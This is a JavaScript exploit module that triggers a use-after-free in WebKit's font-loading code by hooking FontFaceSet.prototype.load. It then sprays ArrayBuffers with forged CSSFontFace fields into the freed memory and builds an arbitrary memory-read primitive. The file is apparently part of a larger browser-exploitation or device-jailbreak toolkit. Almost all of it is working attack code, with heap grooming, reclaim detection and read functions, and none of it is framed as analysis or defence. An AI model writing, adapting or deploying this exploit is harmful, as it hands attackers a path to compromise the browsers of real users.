// userland.js — UAF trigger via FontFaceSet.load hook (works on WebKit-616-1300)

const MEMORY_LIMIT_BYTES = 24 * 1024 * 1024;

// ─── Memory helpers ──────────────────────────────────────
function memUsage() {
  if (typeof performance !== "undefined" && performance.memory) {
    return {
      used:  performance.memory.usedJSHeapSize,
      total: performance.memory.totalJSHeapSize,
      limit: performance.memory.jsHeapSizeLimit,
    };
  }
  return null;
}

function memLog(label) {
  const m = memUsage();
  if (m) {
    logger.debug(
      `[mem:${label}] used=${(m.used / 1048576).toFixed(2)}MB ` +
      `total=${(m.total / 1048576).toFixed(2)}MB ` +
      `cap=${(m.limit / 1048576).toFixed(0)}MB`
    );
  }
}

function assertMemoryHeadroom(extraBytes, stage) {
  const m = memUsage();
  if (!m) return;
  if (m.used + extraBytes > MEMORY_LIMIT_BYTES) {
    throw new Error(
      `OOM guard at ${stage}: ` +
      `used=${(m.used / 1048576).toFixed(2)}MB + ` +
      `need=${(extraBytes / 1048576).toFixed(2)}MB > ` +
      `cap=${(MEMORY_LIMIT_BYTES / 1048576).toFixed(0)}MB`
    );
  }
}

// ─── init_rw ─────────────────────────────────────────────
async function init_rw(opts = {}) {
  const sprayCount    = opts.sprayCount    ?? 0x10;
  const loadTimeoutMs = opts.loadTimeoutMs ?? 3000;

  logger.info(`Initiate UAF (sprayCount=${sprayCount}, timeout=${loadTimeoutMs}ms)`);
  memLog("start");

  // ── FontFace A: guaranteed-resolving source ──
  // "sans-serif" is a CSS generic; every WebKit build maps it to a real font.
  const A = new FontFace("a", "local(sans-serif)", { unicodeRange: "U+0041" });
  document.fonts.add(A);
  void A.loaded;

  // ── Style element with spray rules ──
  const style = document.createElement("style");
  document.head.appendChild(style);

  const sprayRule =
    `@font-face{font-family:spray;src:local(monospace);unicode-range:U+0043}`;
  const uafRule =
    `@font-face{font-family:b;src:url(nonexistent-font.woff);unicode-range:U+0042}`;

  const half = Math.floor(sprayCount / 2);

  for (let i = 0; i < half; i++) {
    try { style.sheet.insertRule(sprayRule, style.sheet.cssRules.length); }
    catch (e) { throw new Error(`insertRule pre ${i}: ${e.message}`); }
  }

  const uafRuleIndex = style.sheet.cssRules.length;
  try { style.sheet.insertRule(uafRule, style.sheet.cssRules.length); }
  catch (e) { throw new Error(`insertRule victim: ${e.message}`); }

  for (let i = half; i < sprayCount; i++) {
    try { style.sheet.insertRule(sprayRule, style.sheet.cssRules.length); }
    catch (e) { throw new Error(`insertRule post ${i}: ${e.message}`); }
  }

  // Materialise CSSFontFace objects for every rule
  void document.body.offsetTop;
  logger.debug("[uaf] CSSFontFace objects materialised");

  // ── Prepare spray slot array ──
  const abs      = new Array(sprayCount);
  const abSize   = constants.wk_CSSFontFace_sizeof;
  const origThen = FontFace.prototype.then;

  assertMemoryHeadroom(abSize * sprayCount + 4096, "pre-spray");

  // ── One-shot free work ──
  let freed = false;
  let freeError = null;

  const doFreeWork = () => {
    if (freed) return;
    freed = true;

    logger.debug("[free] ENTER");

    // 1. Free victim's CSS rule
    try {
      style.sheet.deleteRule(uafRuleIndex);
      logger.debug("[free] victim rule deleted");
    } catch (e) {
      logger.error(`[free] deleteRule victim: ${e.message}`);
    }

    // 2. Free neighbours
    for (let i = style.sheet.cssRules.length - 1; i >= 0; i--) {
      const rule = style.sheet.cssRules[i];
      if (rule.cssText && rule.cssText.indexOf("spray") !== -1) {
        try { style.sheet.deleteRule(i); } catch (_) {}
      }
    }
    logger.debug("[free] neighbour rules deleted");

    // 3. Force CSSFontFace deconstruction
    void document.body.offsetTop;

    // 4. Detach style element
    try { style.remove(); } catch (_) {}
    try { document.head.removeChild(style); } catch (_) {}

    // 5. Spray ArrayBuffers sized to CSSFontFace
    let allocated = 0;
    for (let i = 0; i < abs.length; i++) {
      try {
        const ab = new ArrayBuffer(abSize);
        const view = new DataView(ab);

        view.setBInt(8, 1, true);                             // refcount
        view.setUint8(constants.wk_CSSFontFace_m_status, 3);  // Status::Success

        if (version.major >= 13) {
          const tagOff = constants.wk_CSSFontFace_m_propertiesOrCSSConnection;
          view.setUint8(tagOff, constants.VARIANT_TAG_STYLE_RULE_FONTFACE);
          for (let j = 1; j < 8; j++) view.setUint8(tagOff + j, 0);
        }

        abs[i] = ab;
        allocated++;
      } catch (e) {
        freeError = `ArrayBuffer ${i}/${abs.length}: ${e.message}`;
        logger.error(`[free] ${freeError}`);
        break;
      }
    }
    logger.debug(`[free] allocated ${allocated}/${abs.length}`);
    logger.debug("[free] EXIT");
  };

  // ── Install FontFace.prototype.then getter as a fallback ──
  Object.defineProperty(FontFace.prototype, "then", {
    configurable: true,
    get() {
      if (this === A) {
        doFreeWork();
      }
      return undefined;
    },
  });

  // ── Hook FontFaceSet.prototype.load ──
  // This is the actual trigger on WebKit-616-1300: load() collects
  // matching faces synchronously before returning its promise. The
  // hook runs doFreeWork() right after that collection, so B's JS
  // wrapper is still held by load()'s internal state while B's
  // CSSFontFace memory is freed and reclaimed.
  const origLoad = FontFaceSet.prototype.load;
  let hookFired = false;

  FontFaceSet.prototype.load = function (font, text) {
    const p = origLoad.call(this, font, text);
    if (!hookFired) {
      hookFired = true;
      try { doFreeWork(); }
      catch (e) { freeError = e.message; logger.error(`[hook] ${e.message}`); }
    }
    return p;
  };

  // ── Fire load() — the hook runs inside the call ──
  logger.debug("[uaf] calling document.fonts.load via hooked prototype");
  const loadPromise = document.fonts.load("1em a, b", "AB");
  loadPromise.catch(() => {}); // load may reject once B is freed

  // ── Restore prototype hooks immediately ──
  FontFaceSet.prototype.load = origLoad;
  Object.defineProperty(FontFace.prototype, "then", {
    configurable: true,
    value: origThen,
  });

  // ── Wait for WebKit to settle the load promise ──
  // We race a fixed timeout in case it never settles.
  await Promise.race([
    loadPromise.catch(() => "rejected"),
    new Promise(r => setTimeout(() => r("timeout"), loadTimeoutMs)),
  ]);

  logger.debug(`[uaf] hook fired = ${hookFired}, freed = ${freed}`);
  if (freeError) throw new Error(`free work error: ${freeError}`);

  if (!freed) {
    // Diagnose
    let aStatus = "unknown";
    try { aStatus = A.status; } catch (_) {}
    logger.error(`[diag] A.status = ${aStatus}`);
    logger.error(`[diag] A.unicodeRange = ${A.unicodeRange}`);
    logger.error(`[diag] document.fonts.size = ${document.fonts.size}`);
    throw new Error(
      `FontFaceSet.prototype.load hook never fired. ` +
      `A.status=${aStatus}. document.fonts.load may not exist or ` +
      `may not be called through the prototype on this build.`
    );
  }

  memLog("post-uaf");

  // ── Find the UAF FontFace ──
  // After B's rule is deleted, the JS-visible wrapper for B is still
  // referenced by load()'s internal promise machinery. Its unicodeRange
  // reads "U+0-10FFFF" (the struct default), because the field is
  // now supplied by our sprayed ArrayBuffer.
  let uaf_font = null;
  for (const f of document.fonts) {
    if (f === A) continue;
    try {
      if (f.unicodeRange === "U+0-10FFFF") {
        uaf_font = f;
        break;
      }
    } catch (_) { /* skip broken wrappers */ }
  }

  if (!uaf_font) {
    logger.error(`[diag] document.fonts.size = ${document.fonts.size}`);
    throw new Error("No UAF FontFace found (unicodeRange U+0-10FFFF)");
  }
  logger.info("Found UAF FontFace !!");

  // ── Find the aliased ArrayBuffer (refcount 2) ──
  let uaf_ab = null;
  let uaf_ab_index = -1;
  for (let i = 0; i < abs.length; i++) {
    const ab = abs[i];
    if (!ab) continue;
    try {
      const v = new DataView(ab);
      if (v.getBInt(8, true).eq(2)) {
        uaf_ab = ab;
        uaf_ab_index = i;
        break;
      }
    } catch (_) { /* skip */ }
  }

  if (!uaf_ab) {
    throw new Error("Unable to find ArrayBuffer of UAF FontFace !!");
  }
  logger.info(`Found ArrayBuffer of UAF FontFace at index ${uaf_ab_index}`);

  // ── Free everything else ──
  for (let i = 0; i < abs.length; i++) {
    if (i !== uaf_ab_index) abs[i] = null;
  }
  abs.length = 0;
  try { document.fonts.delete(A); } catch (_) {}

  memLog("post-reclaim");

  // ── Read primitive ──
  const self = {
    uaf_ab,
    uaf_font,

    read(addr, size) {
      const ab = new ArrayBuffer(size);
      const u8 = new Uint8Array(ab);
      const uaf_view = new DataView(self.uaf_ab);

      const useWorkaround = version.major >= 13;

      let offset = 0;
      while (offset < size) {
        const ptr = addr.add(offset);

        if (useWorkaround) {
          const tag_off = constants.wk_CSSFontFace_m_propertiesOrCSSConnection;
          const pay_off = tag_off + 8;

          uaf_view.setUint8(tag_off, constants.VARIANT_TAG_STYLE_RULE_FONTFACE);
          for (let i = 1; i < 8; i++) uaf_view.setUint8(tag_off + i, 0);
          uaf_view.setBInt(pay_off, ptr, true);
        } else {
          uaf_view.setBInt(
            constants.wk_CSSFontFace_m_featureSettings_m_buffer, ptr, true);
          uaf_view.setInt32(
            constants.wk_CSSFontFace_m_featureSettings_m_size, 1, true);
          uaf_view.setInt32(
            constants.wk_CSSFontFace_m_featureSettings_m_capacity, 1, true);
        }

        let chunk = "";
        try {
          chunk = self.uaf_font.featureSettings || "";
        } catch (e) {
          throw new Error(`featureSettings getter threw: ${e.message}`);
        }

        if (chunk.length < 5) {
          throw new Error(
            `featureSettings returned short string: ${JSON.stringify(chunk)} ` +
            `(workaround=${useWorkaround})`
          );
        }

        for (let i = 1; i < 5; i++) {
          u8[offset++] = chunk.charCodeAt(i) & 0xff;
        }
      }

      return ab;
    },

    read8(addr) {
      const ab = self.read(addr, 8);
      return new DataView(ab).getBInt(0, true);
    },

    cleanup() {
      try { document.fonts.clear(); } catch (_) {}
      self.uaf_ab = null;
      self.uaf_font = null;
    },
  };

  return self;
}
